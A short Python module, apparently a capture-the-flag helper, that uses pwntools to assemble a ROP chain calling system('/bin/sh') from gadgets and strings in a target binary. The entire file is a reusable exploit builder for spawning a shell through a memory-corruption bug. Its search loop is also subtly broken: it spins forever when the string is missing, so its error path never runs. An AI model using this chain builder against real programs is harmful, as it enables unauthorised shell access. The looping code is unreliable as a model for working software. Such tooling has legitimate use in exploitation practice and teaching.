from pwnlib.rop import ROP
from pwnlib.util.packing import p64


# todo: fix stack alignment by pivoting over to __pthread_keys or something
def quickrop(progs,ret=False,badchars=b""):
    r = ROP(progs,badchars=badchars)
    binsh = None
    
    if ret:
        r.raw(r.find_gadget(["ret"])[0])
    
    for prog in r.elfs:
        if binsh:
            break
        while not (binsh := next(prog.search(b"/bin/sh\0"),None)):
            continue
            
    if binsh is None:
        raise Exception("no binsh string found D:")
        
    r.system(binsh)
    return r.chain()


__all__ = ["quickrop"]
